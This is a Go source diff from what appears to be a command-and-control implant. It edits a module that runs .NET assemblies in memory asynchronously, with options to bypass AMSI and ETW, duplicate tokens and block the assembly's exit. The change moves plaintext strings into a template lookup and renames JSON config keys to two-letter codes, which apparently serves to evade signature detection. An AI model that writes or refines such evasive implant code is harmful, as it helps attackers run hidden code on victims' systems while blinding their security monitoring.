@@ -53,110 +53,35 @@ const (
 )
 
 // Convenience functions for async-specific strings (uses shared iaTpl from action_inline_assembly.go)
-func iaaOutputStart() string {
-	if s := iaTpl(idxIAOutputStart); s != "" {
-		return s
-	}
-	return "\n>>>\n"
-}
+func iaaOutputStart() string { return iaTpl(idxIAOutputStart) }
 
-func iaaOutputEnd() string {
-	if s := iaTpl(idxIAOutputEnd); s != "" {
-		return s
-	}
-	return "\n<<<\n"
-}
+func iaaOutputEnd() string { return iaTpl(idxIAOutputEnd) }
 
-func iaaRunforFlag() string {
-	if s := iaTpl(idxIARunforFlag); s != "" {
-		return s
-	}
-	return "/runfor"
-}
+func iaaRunforFlag() string { return iaTpl(idxIARunforFlag) }
 
-func iaaColon() string {
-	if s := iaTpl(idxIAColon); s != "" {
-		return s
-	}
-	return ":"
-}
+func iaaColon() string { return iaTpl(idxIAColon) }
 
-func iaaDoneMsg() string {
-	if s := iaTpl(idxIADoneMsg); s != "" {
-		return s
-	}
-	return "\nDone\n"
-}
+func iaaDoneMsg() string { return iaTpl(idxIADoneMsg) }
 
-func iaaDoneExitPrev() string {
-	if s := iaTpl(idxIADoneExitPrev); s != "" {
-		return s
-	}
-	return "\nDone (exit prevented)\n"
-}
+func iaaDoneExitPrev() string { return iaTpl(idxIADoneExitPrev) }
 
-func iaaDoneAfterPre() string {
-	if s := iaTpl(idxIADoneAfterPre); s != "" {
-		return s
-	}
-	return "\nDone after "
-}
+func iaaDoneAfterPre() string { return iaTpl(idxIADoneAfterPre) }
 
-func iaaDoneAfterSuf() string {
-	if s := iaTpl(idxIADoneAfterSuf); s != "" {
-		return s
-	}
-	return "ds\n"
-}
+func iaaDoneAfterSuf() string { return iaTpl(idxIADoneAfterSuf) }
 
-func iaaDonePre() string {
-	if s := iaTpl(idxIADonePre); s != "" {
-		return s
-	}
-	return "\nDone ("
-}
+func iaaDonePre() string { return iaTpl(idxIADonePre) }
 
-func iaaDoneSuf() string {
-	if s := iaTpl(idxIADoneSuf); s != "" {
-		return s
-	}
-	return ")\n"
-}
+func iaaDoneSuf() string { return iaTpl(idxIADoneSuf) }
 
-func iaaExitPrevMsg() string {
-	if s := iaTpl(idxIAExitPrevMsg); s != "" {
-		return s
-	}
-	return "\nExit prevented\n"
-}
+func iaaExitPrevMsg() string { return iaTpl(idxIAExitPrevMsg) }
 
-func iaaKwExit() string {
-	if s := iaTpl(idxIAKwExit); s != "" {
-		return s
-	}
-	return "exit"
-}
+func iaaKwExit() string { return iaTpl(idxIAKwExit) }
 
-func iaaKwTerminate() string {
-	if s := iaTpl(idxIAKwTerminate); s != "" {
-		return s
-	}
-	return "terminate"
-}
+func iaaKwTerminate() string { return iaTpl(idxIAKwTerminate) }
 
-func iaaClrErrCode() string {
-	if s := iaTpl(idxIAClrErrCode); s != "" {
-		return s
-	}
-	return "0x80131604"
-}
+func iaaClrErrCode() string { return iaTpl(idxIAClrErrCode) }
 
-func iaaClrCorrupt() string {
-	if s := iaTpl(idxIAClrCorrupt); s != "" {
-		return s
-	}
-	return "\nCLR corrupted (0x80131604)\n"
-}
+func iaaClrCorrupt() string { return iaTpl(idxIAClrCorrupt) }
 
 // AssemblyTokenContext stores token information for assembly execution
 type AssemblyTokenContext struct {
@@ -282,15 +207,15 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 
 // executeWindowsAssemblyAsync executes assembly asynchronously with protection against exit
 func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes []byte, config struct {
-	AssemblyB64 string   `json:"assembly_b64"`
-	Arguments   []string `json:"arguments"`
-	AppDomain   string   `json:"app_domain"`
-	BypassAMSI  bool     `json:"bypass_amsi"`
-	BypassETW   bool     `json:"bypass_etw"`
-	RevertETW   bool     `json:"revert_etw"`
-	EntryPoint  string   `json:"entry_point"`
-	UsePipe     bool     `json:"use_pipe"`
-	PipeName    string   `json:"pipe_name"`
+	AssemblyB64 string   `json:"ab"`
+	Arguments   []string `json:"ar"`
+	AppDomain   string   `json:"ad"`
+	BypassAMSI  bool     `json:"ba"`
+	BypassETW   bool     `json:"be"`
+	RevertETW   bool     `json:"re"`
+	EntryPoint  string   `json:"ep"`
+	UsePipe     bool     `json:"up"`
+	PipeName    string   `json:"pm"`
 }, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
 	job.Output.WriteString(iaaOutputStart())
 
